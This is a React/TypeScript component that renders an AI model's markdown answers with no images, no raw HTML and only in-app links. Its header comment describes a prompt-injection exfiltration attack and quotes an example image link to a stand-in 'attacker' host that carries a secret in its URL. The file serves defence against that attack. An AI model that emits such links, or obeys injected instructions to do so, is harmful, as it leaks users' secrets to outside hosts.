// Atlas's answers, rendered closed. The web's `atlas-markdown.tsx`, on the
// desktop's prose styles.
//
// An answer is model output, and the model reads what other people wrote:
// webhook posts, comments, prompts. The classic way to turn that into a leak
// is an instruction to emit `![](https://attacker/?d=<secret>)` — the image is
// fetched the moment it is drawn, and the secret leaves in its URL. So nothing
// here makes the page load anything, and nothing links off Atlas:
//
// - **no images.** Markdown images become their alt text; there is no `img`;
// - **raw HTML is dropped** (`skipHtml`), never parsed into elements;
// - **links go into the app or nowhere.** A handle (`ses-N`, `wp-N`, `cm-N`,
//   `conv:…`, `msg:…`) this Ask's tools returned, or one of Atlas's own
//   routes, opens in place; every other URL is drawn as text;
// - a paragraph that starts `Suggestion:` is styled as a suggestion;
// - `[erased]`, what the server writes over a quote of an erased Session, is
//   drawn as a marker.
//
// The chat renderer is deliberately not reused: it links `https:` URLs, which
// is right for a person's message and wrong for a model's.

import { memo, useMemo, type ReactNode } from "react";
import ReactMarkdown, { type Components, type ExtraProps } from "react-markdown";
import remarkGfm from "remark-gfm";

import { cn } from "@/lib/utils";

import {
  HANDLE_PATTERN,
  routeTarget,
  targetForHandle,
  type OrgAgentTarget,
} from "../lib/org-agent-links";

const HANDLE_SCHEME = "atlas-handle:";
const ERASED_SCHEME = "atlas-erased:";
const ERASED_MARK = "[erased]";

interface MdNode {
  type: string;
  value?: string;
  url?: string;
  children?: MdNode[];
}

/** Where a handle can sit and still be one: not inside code, a link or an image. */
const OPAQUE = new Set([
  "link",
  "linkReference",
  "inlineCode",
  "code",
  "image",
  "imageReference",
  "definition",
  "html",
]);

/** Split the text nodes around handles and `[erased]`, as link nodes. */
function linkHandles(node: MdNode): void {
  if (!node.children || OPAQUE.has(node.type)) return;
  const next: MdNode[] = [];
  for (const child of node.children) {
    if (child.type !== "text" || !child.value) {
      linkHandles(child);
      next.push(child);
      continue;
    }
    const parts = child.value.split(ERASED_MARK);
    parts.forEach((part, i) => {
      if (i > 0)
        next.push({
          type: "link",
          url: ERASED_SCHEME,
          children: [{ type: "text", value: ERASED_MARK }],
        });
      let at = 0;
      for (const match of part.matchAll(HANDLE_PATTERN)) {
        const start = match.index;
        if (start > at) next.push({ type: "text", value: part.slice(at, start) });
        next.push({
          type: "link",
          url: `${HANDLE_SCHEME}${match[0]}`,
          children: [{ type: "text", value: match[0] }],
        });
        at = start + match[0].length;
      }
      if (at < part.length) next.push({ type: "text", value: part.slice(at) });
    });
  }
  node.children = next;
}

function remarkHandles() {
  return (tree: MdNode) => linkHandles(tree);
}

const PLUGINS = [remarkGfm, remarkHandles];

/** The URL is never transformed: it is only ever drawn as text or checked. */
const keepUrl = (url: string) => url;

type HastLike = { type: string; value?: string; children?: unknown[] };
function textOf(node: ExtraProps["node"] | HastLike | undefined): string {
  if (!node) return "";
  if ("value" in node && typeof node.value === "string") return node.value;
  const children = ("children" in node ? node.children : []) as HastLike[];
  return children.map(textOf).join("");
}

export const OrgAgentMarkdown = memo(function OrgAgentMarkdown({
  source,
  handles,
  onOpen,
  className,
}: {
  source: string;
  /** Handles this Ask's tools returned (`handleIndex`); others stay text. */
  handles: ReadonlyMap<string, OrgAgentTarget>;
  onOpen: (target: OrgAgentTarget) => void;
  className?: string;
}) {
  const components = useMemo<Components>(() => {
    function InApp({
      target,
      children,
      mono,
    }: {
      target: OrgAgentTarget;
      children: ReactNode;
      mono?: boolean;
    }) {
      // A button, not an `<a href>`: it opens a place in this app, never a URL.
      return (
        <button
          type="button"
          data-atlas-link=""
          className={cn(
            // The prose's own link colour and hover (`.atlas-prose a`).
            "inline cursor-pointer whitespace-nowrap text-info underline-offset-2 hover:underline",
            mono && "font-mono",
          )}
          onClick={() => onOpen(target)}
        >
          {children}
        </button>
      );
    }
    return {
      a({ href = "", children, node }) {
        if (href === ERASED_SCHEME) {
          return (
            <span
              data-erased=""
              title="This text came from a session that was deleted."
              className="rounded-sm bg-muted px-1 text-2xs text-muted-foreground"
            >
              erased
            </span>
          );
        }
        if (href.startsWith(HANDLE_SCHEME)) {
          const target = targetForHandle(href.slice(HANDLE_SCHEME.length), handles);
          return target ? (
            <InApp target={target} mono>
              {children}
            </InApp>
          ) : (
            <span className="font-mono">{children}</span>
          );
        }
        const target = routeTarget(href);
        if (target) return <InApp target={target}>{children}</InApp>;
        // Anything else is text; the address beside a label that hides it,
        // so the reader can see where it pointed.
        const label = textOf(node);
        return (
          <span data-unlinked="">
            {children}
            {href && label.trim() !== href.trim() && !href.startsWith("#") && (
              <span className="text-muted-foreground"> ({href})</span>
            )}
          </span>
        );
      },
      img({ alt }) {
        const text = alt?.trim();
        return (
          <span className="text-muted-foreground">{text ? `[image: ${text}]` : "[image]"}</span>
        );
      },
      p({ children, node }) {
        if (/^\s*Suggestion:/.test(textOf(node))) {
          return (
            <p
              data-suggestion=""
              className="rounded-md border-l-2 border-info bg-info-muted px-3 py-2 text-foreground"
            >
              {children}
            </p>
          );
        }
        return <p>{children}</p>;
      },
    };
  }, [handles, onOpen]);

  return (
    <div className={cn("atlas-prose min-w-0 break-words select-text", className)}>
      <ReactMarkdown
        remarkPlugins={PLUGINS}
        skipHtml
        urlTransform={keepUrl}
        components={components}
      >
        {source}
      </ReactMarkdown>
    </div>
  );
});
